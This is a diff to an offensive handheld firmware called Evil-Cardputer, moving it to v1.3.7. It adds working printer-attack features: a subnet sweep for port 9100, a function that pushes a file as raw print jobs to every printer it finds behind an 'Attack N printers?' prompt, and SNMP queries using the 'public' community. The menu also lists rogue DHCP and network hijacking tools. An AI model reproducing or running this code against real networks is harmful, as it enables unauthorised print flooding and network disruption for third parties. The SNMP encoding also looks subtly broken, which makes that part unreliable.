@@ -171,6 +171,9 @@ const char* menuItems[] = {
     "Rogue DHCP",
     "Switch DNS",
     "Network Hijacking",
+    "Detect Printer",
+    "File Print",
+    "Check printer status",
     "Settings",
 };
 
@@ -944,7 +947,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.3.6 2024";
+  const char* text3 = "v1.3.7 2024";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -974,7 +977,7 @@ void setup() {
   Serial.println("-------------------");
   Serial.println("Evil-Cardputer");
   Serial.println("By 7h30th3r0n3");
-  Serial.println("v1.3.6 2024");
+  Serial.println("v1.3.7 2024");
   Serial.println("-------------------");
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1053,6 +1056,7 @@ void setup() {
         delay(1000);
       } else {
         Serial.println("Fail to connect to Wifi or timeout...");
+        WiFi.mode(WIFI_MODE_STA);
       }
   } else {
     Serial.println("SSID is empty.");
@@ -1114,7 +1118,7 @@ void sshConnect(const char *host = nullptr);
 
 
 unsigned long lastTaskBarUpdateTime = 0;
-const long taskBarUpdateInterval = 2500; // Mettre à jour chaque seconde
+const long taskBarUpdateInterval = 1000; // Mettre à jour chaque seconde
 bool pageAccessFlag = false;
 
 int getConnectedPeopleCount() {
@@ -1472,6 +1476,15 @@ void executeMenuItem(int index) {
         DHCPAttackAuto();
         break;
     case 49:
+        detectPrinter();
+        break;
+    case 50:
+        printFile();
+        break;
+    case 51:
+        checkPrinterStatus();
+        break;
+    case 52:
         showSettingsMenu();
         break;
   }
@@ -1496,14 +1509,21 @@ void handleMenuInput() {
   const unsigned long keyRepeatDelay = 150; // Délai entre les répétitions d'appui
   static bool keyHandled = false;
   static int previousIndex = -1; // Pour suivre les changements d'index
-    enterDebounce();
+  enterDebounce();
   M5.update();
   M5Cardputer.update();
 
   // Variable pour suivre les changements d'état du menu
   bool stateChanged = false;
 
-  if (M5Cardputer.Keyboard.isKeyPressed(';')) {
+  if (M5Cardputer.Keyboard.isKeyPressed(KEY_LEFT_CTRL) && M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+    if (millis() - lastKeyPressTime > keyRepeatDelay) {
+      doTheThing();
+      lastKeyPressTime = millis();
+      stateChanged = true;
+    }
+    keyHandled = true;
+  } else if (M5Cardputer.Keyboard.isKeyPressed(';')) {
     if (millis() - lastKeyPressTime > keyRepeatDelay) {
       currentIndex--;
       if (currentIndex < 0) {
@@ -1543,6 +1563,132 @@ void handleMenuInput() {
     drawMenu();
     previousIndex = currentIndex; // Mise à jour de l'index précédent
   }
+}
+
+
+const uint8_t line1_hex[] = {
+  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
+  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
+  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
+  0x2D, 0x2D
+};
+const size_t line1_len = sizeof(line1_hex);
+
+const uint8_t line2_hex[] = {
+  0x20, 0x54, 0x68, 0x61, 0x6E, 0x6B, 0x20, 0x79,
+  0x6F, 0x75, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x75,
+  0x73, 0x69, 0x6E, 0x67, 0x20, 0x45, 0x76, 0x69,
+  0x6C
+};
+const size_t line2_len = sizeof(line2_hex);
+
+const uint8_t line3_hex[] = {
+  0x20, 0x20, 0x20, 0x6D, 0x61, 0x64, 0x65, 0x20,
+  0x77, 0x69, 0x74, 0x68, 0x20, 0x3C, 0x33, 0x20,
+  0x6C, 0x6F, 0x76, 0x65, 0x20, 0x62, 0x79
+};
+const size_t line3_len = sizeof(line3_hex);
+
+const uint8_t line4_hex[] = {
+  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x37, 0x68, 0x33,
+  0x30, 0x74, 0x68, 0x33, 0x72, 0x30, 0x6E, 0x33
+};
+const size_t line4_len = sizeof(line4_hex);
+
+const uint8_t line5_hex[] = {
+  0x20, 0x20, 0x20, 0x20, 0x20, 0x45, 0x74, 0x68,
+  0x69, 0x63, 0x61, 0x6C, 0x20, 0x48, 0x61, 0x63,
+  0x6B, 0x65, 0x72, 0x2E
+};
+const size_t line5_len = sizeof(line5_hex);
+
+const uint8_t line6_hex[] = {
+  0x20, 0x20, 0x20, 0x43, 0x69, 0x74, 0x69, 0x7A,
+  0x65, 0x6E, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68,
+  0x65, 0x20, 0x77, 0x6F, 0x72, 0x6C, 0x64, 0x2E
+};
+const size_t line6_len = sizeof(line6_hex);
+
+const uint8_t line7_hex[] = {
+  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
+  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
+  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
+  0x2D, 0x2D
+};
+const size_t line7_len = sizeof(line7_hex);
+
+const uint8_t line8_hex[] = {
+  0x49, 0x74, 0x27, 0x73, 0x20, 0x61, 0x6C, 0x6C,
+  0x20, 0x61, 0x62, 0x6F, 0x75, 0x74, 0x20, 0x69,
+  0x6E, 0x74, 0x65, 0x6E, 0x73, 0x69, 0x74, 0x79,
+  0x2E
+};
+const size_t line8_len = sizeof(line8_hex);
+
+const uint8_t line9_hex[] = {
+  0x20, 0x20, 0x20, 0x54, 0x68, 0x65, 0x72, 0x65,
+  0x20, 0x69, 0x73, 0x20, 0x6E, 0x6F, 0x20, 0x73,
+  0x70, 0x6F, 0x6F, 0x6E, 0x2E
+};
+const size_t line9_len = sizeof(line9_hex);
+
+const uint8_t line10_hex[] = {
+  0x20, 0x20, 0x20, 0x20, 0x48, 0x61, 0x63, 0x6B, 0x20,
+  0x74, 0x68, 0x65, 0x20, 0x70, 0x6C, 0x61, 0x6E,
+  0x65, 0x74, 0x2E
+};
+const size_t line10_len = sizeof(line10_hex);
+
+const uint8_t line11_hex[] = {
+  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
+  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
+  0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
+  0x2D, 0x2D
+};
+const size_t line11_len = sizeof(line11_hex);
+
+const uint8_t* allLines[] = {
+  line1_hex, line2_hex, line3_hex, line4_hex, line5_hex,
+  line6_hex, line7_hex, line8_hex, line9_hex, line10_hex,
+  line11_hex,
+};
+
+const size_t allLinesLen[] = {
+  line1_len, line2_len, line3_len, line4_len, line5_len,
+  line6_len, line7_len, line8_len, line9_len, line10_len,
+  line11_len,
+};
+
+const int numLines = sizeof(allLines) / sizeof(allLines[0]);
+void hexToString(const uint8_t* data, size_t length, char* output) {
+  for (size_t i = 0; i < length; i++) {
+    output[i] = (char)data[i];
+  }
+  output[length] = '\0';
+}
+
+void doTheThing() {
+  M5.Lcd.fillScreen(BLACK); 
+  M5.Lcd.setTextColor(GREEN, BLACK); 
+  M5.Lcd.setTextSize(1.5); 
+  M5.Lcd.setCursor(0, 0); 
+  char buffer[64];
+  for (int i = 0; i < numLines; i++) {
+    hexToString(allLines[i], allLinesLen[i], buffer);
+    const char* p = buffer;
+    while (*p) {
+      M5.Lcd.print(*p++);
+      delay(50);
+    }
+    M5.Lcd.println();
+    delay(200);
+  }
+  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    M5.update();
+    M5Cardputer.update();
+    delay(100);
+  }
+  waitAndReturnToMenu("Return to menu");
 }
 
 
@@ -5823,9 +5969,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.3.6"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.3.7"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.3.6"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.3.7"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -10259,7 +10405,7 @@ int totalNetworks = 0;
 unsigned long lastLog = 0;
 int currentScreen = 1;  // Track which screen is currently displayed
 
-const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.3.6,model=Cardputer,release=v1.3.6,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
+const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.3.7,model=Cardputer,release=v1.3.7,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
     "MAC", "SSID", "AuthMode", "FirstSeen", "Channel", "RSSI", "CurrentLatitude", "CurrentLongitude", "AltitudeMeters", "AccuracyMeters", "Type"
@@ -11561,7 +11707,7 @@ void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanI
     const int ports[] = {
         20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 110, 123, 135, 137, 139, 143, 161, 162, 389, 443, 445, 465, 
         514, 554, 587, 631, 636, 873, 993, 995, 1024, 1025, 1352, 1433, 1521, 1720, 1723, 2049, 2181, 2222, 
-        2375, 2376, 3306, 3389, 3690, 5000, 5060, 5432, 5555, 5900, 5985, 5986, 6379, 8080, 8443, 9000, 
+        2375, 2376, 3306, 3389, 3690, 5000, 5060, 5432, 5555, 5900, 5985, 5986, 6379, 8080, 8443, 9000, 9100, 
         9200, 9999, 10000, 11211, 1194, 27017, 32768, 49152, 49153, 49154, 49155, 49156, 49157
     };
 
@@ -11578,7 +11724,7 @@ void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanI
         {1723, "PPTP"}, {2049, "NFS"}, {2181, "Zookeeper"}, {2222, "SSH Alt"}, {2375, "Docker"},
         {2376, "DockerTLS"}, {3306, "MySQL"}, {3389, "RDP"}, {3690, "SVN"}, {5000, "UPnP"}, {5060, "SIP"},
         {5432, "PostgreSQL"}, {5555, "ADB"}, {5900, "VNC"}, {5985, "WinRM HTTP"}, {5986, "WinRMHTTPS"},
-        {6379, "Redis"}, {8080, "HTTP Proxy"}, {8443, "HTTPS Alt"}, {9000, "SonarQube"}, {9200, "Elasticsrc"},
+        {6379, "Redis"}, {8080, "HTTP Proxy"}, {8443, "HTTPS Alt"}, {9000, "SonarQube"}, {9100, "PJL"}, {9200, "Elasticsrc"},
         {9999, "Urchin"}, {10000, "Webmin"}, {11211, "Memcached"}, {1194, "OpenVPN"}, {27017, "MongoDB"},
         {32768, "RPC"}, {49152, "WinRPC"}, {49153, "WinRPC"}, {49154, "WinRPC"}, {49155, "WinRPC"},
         {49156, "WinRPC"}, {49157, "WinRPC"}
@@ -12741,10 +12887,11 @@ void detectDHCPServer() {
     M5.Display.println("Press ENTER to cancel");
     M5.Display.display();
     dhcpServerDetected = false;
-    while (millis() - startMillis < 16000) { // Maximum wait time of 30 seconds
+
+    while (millis() - startMillis < 16000) { // Maximum wait time of 16 seconds
         M5.update();
         M5Cardputer.update();
-        
+
         if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
             Serial.println("Detection cancelled by user");
             M5.Display.clear(menuBackgroundColor);
@@ -12768,6 +12915,13 @@ void detectDHCPServer() {
                 uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
                 if (messageType == 2) { // DHCP Offer
                     dhcpServerIP = IPAddress(packetBuffer[20], packetBuffer[21], packetBuffer[22], packetBuffer[23]);
+                    
+                    // Check if the detected DHCP server is 0.0.0.0
+                    if (dhcpServerIP.toString() == "0.0.0.0") {
+                        Serial.println("DHCP server detected as 0.0.0.0. Using gateway as fallback.");
+                        dhcpServerIP = currentGateway;
+                    }
+
                     Serial.printf("DHCP server detected: %s\n", dhcpServerIP.toString().c_str());
                     M5.Display.printf("DHCP server found:\n%s\n", dhcpServerIP.toString().c_str());
                     M5.Display.display();
@@ -12778,12 +12932,21 @@ void detectDHCPServer() {
             }
         }
     }
-    Serial.println("No DHCP server detected after timeout.");
-    M5.Display.println("No DHCP server detected");
-    M5.Display.println("Timeout reached");
-    M5.Display.display();
-    delay(2000);
+
+    if (!dhcpServerDetected) {
+        // Fallback to using the gateway as the DHCP server
+        dhcpServerIP = currentGateway;
+        Serial.println("No DHCP server detected. Using gateway as fallback.");
+        M5.Display.clear(menuBackgroundColor);
+        M5.Display.println("No DHCP server found.");
+        M5.Display.println("Using gateway as fallback:");
+        M5.Display.printf("Gateway: %s\n", dhcpServerIP.toString().c_str());
+        M5.Display.display();
+        delay(2000);
+    }
 }
+
+
 
 
 int percentage = 0;
@@ -13423,4 +13586,430 @@ void DHCPAttackAuto(){
     }
   }
   switchDNS();
+}
+
+
+
+
+
+
+// Global vector for detected printers
+std::vector<IPAddress> detectedPrinters;
+
+// Checks if a host is a printer (port 9100 open)
+bool isPrinter(IPAddress ip, uint32_t timeout_ms = 150) {
+    WiFiClient client; // Instance of WiFiClient
+    Serial.printf("[TEST] Checking IP: %s for printer on port 9100\n", ip.toString().c_str());
+
+    if (connectWithTimeout(client, ip, 9100, timeout_ms)) {
+        Serial.printf("[INFO] Printer detected at IP: %s\n", ip.toString().c_str());
+        client.stop(); // Close the connection properly
+        return true;
+    } else {
+        Serial.printf("[INFO] No printer found at IP: %s\n", ip.toString().c_str());
+        return false;
+    }
+}
+
+bool validateBaseIP(const String& baseIP) {
+    int dotCount = 0;
+    for (char c : baseIP) {
+        if (c == '.') dotCount++;
+        else if (!isDigit(c)) return false;
+    }
+    return dotCount == 2; // Ensures "192.168.1" contains only two dots
+}
+
+String getNetworkBase() {
+    String baseIP = "";
+    M5.Display.clear();
+    M5.Display.setTextSize(1.5);
+    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+    M5.Display.setCursor(0, 0);
+    M5.Display.println("Enter base IP (192.168.1):");
+    M5.Display.setCursor(0, 50);
+
+    while (true) {
+        baseIP = getUserInput(); // Reuses your `getUserInput` function
+
+        // If the user enters "ok", use the current network IP
+        if (baseIP == "ok") {
+            IPAddress currentIP = WiFi.localIP();
+            char fallbackIP[16];
+            sprintf(fallbackIP, "%d.%d.%d", currentIP[0], currentIP[1], currentIP[2]);
+            return String(fallbackIP);
+        }
+
+        // Validate partial IP address format
+        if (validateBaseIP(baseIP)) {
+            return baseIP;
+        } else {
+            M5.Display.setCursor(0, 80);
+            M5.Display.println("Invalid format! Retry.");
+            delay(2000);
+            M5.Display.clear();
+            M5.Display.setCursor(0, 0);
+            M5.Display.println("Enter base IP (192.168.1):");
+        }
+    }
+}
+
+void detectPrinter() {
+    if (WiFi.localIP().toString() == "0.0.0.0") {
+        Serial.println("[INFO] Not connected to a network.");
+        waitAndReturnToMenu("Not connected to a network.");
+        return;
+    }
+
+    // Get the base network IP
+    String baseIP = getNetworkBase();
+    char base_ip[16];
+    sprintf(base_ip, "%s.", baseIP.c_str());
+
+    Serial.println("[INFO] Network base IP: " + String(base_ip));
+    M5.Display.clear();
+    M5.Display.setCursor(0, 20);
+    M5.Display.println("Scanning for printers...");
+    M5.Display.display();
+
+    detectedPrinters.clear();
+
+    // Scan subnet IP addresses
+    for (int i = 1; i <= 254; i++) {
+        IPAddress currentIP;
+        sscanf(base_ip, "%d.%d.%d.", &currentIP[0], &currentIP[1], &currentIP[2]);
+        currentIP[3] = i;
+
+        Serial.printf("[DEBUG] Checking IP: %s\n", currentIP.toString().c_str());
+
+        // Check directly for port 9100 with a 100ms timeout
+        if (isPrinter(currentIP, 100)) {
+            detectedPrinters.push_back(currentIP);
+            Serial.printf("[INFO] Printer detected: %s\n", currentIP.toString().c_str());
+        }
+
+        // Progress update
+        if (i % 10 == 0) {
+            M5.Display.setCursor(0, 40);
+            M5.Display.printf("Scanned %d/254 IPs...\n", i);
+            M5.Display.display();
+        }
+    }
+
+    // Final result
+    M5.Display.clear();
+    if (detectedPrinters.empty()) {
+        M5.Display.setCursor(0, 20);
+        M5.Display.println("No printers detected.");
+        M5.Display.println("Returning to menu...");
+        M5.Display.display();
+        Serial.println("[INFO] No printers detected.");
+    } else {
+        M5.Display.setCursor(0, 20);
+        M5.Display.println("Printers found:");
+        for (const auto &printerIP : detectedPrinters) {
+            Serial.println(" - " + printerIP.toString());
+            M5.Display.println(printerIP.toString());
+        }
+        M5.Display.display();
+    }
+
+    delay(2000);
+    waitAndReturnToMenu("return to menu");
+}
+
+void printFile() {
+      if (WiFi.localIP().toString() == "0.0.0.0") {
+        Serial.println("[INFO] Not connected to a network.");
+        waitAndReturnToMenu("Not connected to a network.");
+        return;
+    }
+    // File path to print and printer IP configuration
+    String filePath = "/Printer/File-To-Print.txt"; // Replace with your file
+    String printerConfigPath = "/Printer/PrinterIp.txt";
+
+    std::vector<IPAddress> printerIPs;
+
+    // Check for necessary files
+    if (!SD.exists(filePath)) {
+        M5.Display.clear();
+        M5.Display.setCursor(0, 20);
+        M5.Display.println("File not found:");
+        M5.Display.println(filePath);
+        waitAndReturnToMenu("return to menu");
+        return;
+    }
+
+    if (!SD.exists(printerConfigPath)) {
+        Serial.println("Printer configuration file not found.");
+    }
+
+    // Open printer configuration file
+    File config = SD.open(printerConfigPath);
+    if (config) {
+        while (config.available()) {
+            String line = config.readStringUntil('\n');
+            line.trim(); // Removes whitespace and newlines
+            if (line.length() > 0) {
+                IPAddress ip;
+                if (ip.fromString(line)) {
+                    printerIPs.push_back(ip);
+                } else {
+                    Serial.printf("Invalid IP format in PrinterIp.txt: %s\n", line.c_str());
+                }
+            }
+        }
+        config.close();
+    }
+
+    // If the file is empty, use detected printers
+    if (printerIPs.empty()) {
+        printerIPs = detectedPrinters;
+    }
+
+    // Check if there are printers to process
+    if (printerIPs.empty()) {
+        M5.Display.clear();
+        M5.Display.setCursor(0, 20);
+        M5.Display.println("No printers detected");
+        M5.Display.println("or configured.");
+        M5.Display.println("Returning to menu...");
+        M5.Display.display();
+        delay(2000);
+        waitAndReturnToMenu("return to menu");
+        return;
+    }
+
+    // Confirm operation with the user
+    String message = "Attack " + String(printerIPs.size()) + " printers?";
+    if (!confirmPopup(message)) {
+        M5.Display.clear();
+        M5.Display.setCursor(0, 20);
+        M5.Display.println("Operation cancelled by user.");
+        M5.Display.display();
+        delay(2000);
+        waitAndReturnToMenu("return to menu");
+        return;
+    }
+
+    // Open the file to print
+    File file = SD.open(filePath);
+    if (!file) {
+        M5.Display.clear();
+        M5.Display.setCursor(0, 20);
+        M5.Display.println("Failed to open file:");
+        M5.Display.println(filePath);
+        M5.Display.println("Returning to menu...");
+        M5.Display.display();
+        delay(2000);
+        waitAndReturnToMenu("return to menu");
+        return;
+    }
+
+    // Send the file to each printer
+    for (IPAddress printerIP : printerIPs) {
+        WiFiClient client;
+
+        // Connect to the printer on port 9100
+        if (!client.connect(printerIP, 9100)) {
+            Serial.printf("Failed to connect to printer: %s\n", printerIP.toString().c_str());
+            continue;
+        }
+
+        // Display current status on the screen
+        M5.Display.clear();
+        M5.Display.setCursor(0, 20);
+        M5.Display.println("Printing to:");
+        M5.Display.println(printerIP.toString());
+        M5.Display.display();
+        delay(200);
+
+        // Reset file position
+        file.seek(0);
+
+        // Read the file and send its content to the printer
+        while (file.available()) {
+            String line = file.readStringUntil('\n'); // Read line by line
+            client.println(line);                     // Send to the printer
+        }
+
+        client.stop();
+        Serial.printf("Print job completed for printer: %s\n", printerIP.toString().c_str());
+    }
+
+    file.close();
+
+    // Confirm operation completion
+    M5.Display.clear();
+    M5.Display.setCursor(0, 20);
+    M5.Display.println("Print job completed");
+    M5.Display.println("on all printers!");
+    M5.Display.display();
+    delay(2000);
+    waitAndReturnToMenu("return to menu");
+}
+
+
+
+// Define the SNMP community and port
+#define SNMP_PORT 161
+#define SNMP_COMMUNITY "public"
+
+
+// Function to send an SNMP GET request
+bool sendSNMPRequest(IPAddress printerIP, const char* oid, String& response) {
+    uint8_t packet[50];
+    int packetLength = 0;
+
+    // SNMP header construction
+    packet[0] = 0x30; // Sequence
+    packet[1] = 0;    // Placeholder for packet length
+    packet[2] = 0x02; // Integer (version)
+    packet[3] = 0x01;
+    packet[4] = 0x00; // SNMP version 1
+
+    // Community string
+    packet[5] = 0x04; // Octet string
+    packet[6] = strlen(SNMP_COMMUNITY);
+    memcpy(&packet[7], SNMP_COMMUNITY, strlen(SNMP_COMMUNITY));
+
+    // PDU header
+    int pduStart = 7 + strlen(SNMP_COMMUNITY);
+    packet[pduStart] = 0xA0; // GET Request
+    packet[pduStart + 1] = 0; // Placeholder for PDU length
+    packet[pduStart + 2] = 0x02; // Integer (request ID)
+    packet[pduStart + 3] = 0x01;
+    packet[pduStart + 4] = 0x01; // Request ID = 1
+
+    // Error and error index
+    packet[pduStart + 5] = 0x02;
+    packet[pduStart + 6] = 0x01;
+    packet[pduStart + 7] = 0x00;
+    packet[pduStart + 8] = 0x02;
+    packet[pduStart + 9] = 0x01;
+    packet[pduStart + 10] = 0x00;
+
+    // Variable bindings
+    int vbStart = pduStart + 11;
+    packet[vbStart] = 0x30; // Sequence
+    packet[vbStart + 1] = 0; // Placeholder for variable bindings length
+    packet[vbStart + 2] = 0x06; // Object identifier
+    packet[vbStart + 3] = strlen(oid);
+    memcpy(&packet[vbStart + 4], oid, strlen(oid));
+    packet[vbStart + 4 + strlen(oid)] = 0x05; // Null value
+    packet[vbStart + 5 + strlen(oid)] = 0x00;
+
+    // Calculate lengths
+    int vbLength = 6 + strlen(oid);
+    packet[vbStart + 1] = vbLength;
+    int pduLength = vbLength + 11;
+    packet[pduStart + 1] = pduLength;
+    int packetLengthFinal = pduLength + 7 + strlen(SNMP_COMMUNITY);
+    packet[1] = packetLengthFinal - 2;
+
+    // Send packet
+    udp.beginPacket(printerIP, SNMP_PORT);
+    udp.write(packet, packetLengthFinal);
+    udp.endPacket();
+
+    // Wait for response
+    uint32_t startTime = millis();
+    while (millis() - startTime < 1000) {
+        int packetSize = udp.parsePacket();
+        if (packetSize) {
+            uint8_t buffer[255];
+            udp.read(buffer, 255);
+
+            // Extract the response value
+            response = String((char*)&buffer[packetSize - 1]);
+            return true;
+        }
+    }
+    return false;
+}
+
+// Function to check printer status
+void checkPrinterStatus() {
+      if (WiFi.localIP().toString() == "0.0.0.0") {
+        Serial.println("[INFO] Not connected to a network.");
+        waitAndReturnToMenu("Not connected to a network.");
+        return;
+    }
+
+    // Clear display
+    M5.Display.clear();
+    M5.Display.setTextSize(1);
+    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+    M5.Display.setCursor(0, 0);
+    M5.Display.println("Checking printer status...");
+
+    // Load printer IPs from configuration or use detected printers
+    String printerConfigPath = "/Printer/PrinterIp.txt";
+    std::vector<IPAddress> printerIPs;
+
+    // Check for configuration file on the SD card
+    if (SD.exists(printerConfigPath)) {
+        File config = SD.open(printerConfigPath);
+        if (config) {
+            while (config.available()) {
+                String line = config.readStringUntil('\n');
+                line.trim();
+                if (!line.isEmpty()) {
+                    IPAddress ip;
+                    if (ip.fromString(line)) {
+                        printerIPs.push_back(ip);
+                    } else {
+                        Serial.printf("Invalid IP format in PrinterIp.txt: %s\n", line.c_str());
+                    }
+                }
+            }
+            config.close();
+        }
+    }
+
+    // If configuration file is empty, use detected printers
+    if (printerIPs.empty()) {
+        printerIPs = detectedPrinters;
+    }
+
+    // Check if there are any printers to process
+    if (printerIPs.empty()) {
+        M5.Display.setCursor(0, 20);
+        M5.Display.println("No printers detected or configured.");
+        Serial.println("[INFO] No printers to check.");
+        waitAndReturnToMenu("No printers to check.");
+        return;
+    }
+
+    // OIDs for printer information
+    const char* deviceOid = "1.3.6.1.2.1.25.3.2.1.3.1"; // Device description
+    const char* statusOid = "1.3.6.1.2.1.25.3.2.1.5.1"; // Status
+    const char* uptimeOid = "1.3.6.1.2.1.1.3.0";        // Uptime
+
+    // Iterate over printers
+    int yOffset = 0;
+    for (const auto& printerIP : printerIPs) {
+        String device, status, uptime;
+
+        if (sendSNMPRequest(printerIP, deviceOid, device) &&
+            sendSNMPRequest(printerIP, statusOid, status) &&
+            sendSNMPRequest(printerIP, uptimeOid, uptime)) {
+            M5.Display.setCursor(0, yOffset);
+            M5.Display.printf("%s\nDevice: %s\nStatus: %s\nUptime: %s\n",
+                              printerIP.toString().c_str(), device.c_str(), status.c_str(), uptime.c_str());
+            yOffset += 40;
+        } else {
+            Serial.printf("Failed to fetch SNMP data for printer: %s\n", printerIP.toString().c_str());
+        }
+    }
+
+    // Finalize display
+    M5.Display.setCursor(0, yOffset);
+    M5.Display.println("Done checking printers.");
+    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      M5.update();
+      M5Cardputer.update();
+      delay(100);
+  }
+  waitAndReturnToMenu("Return to menu");
 }
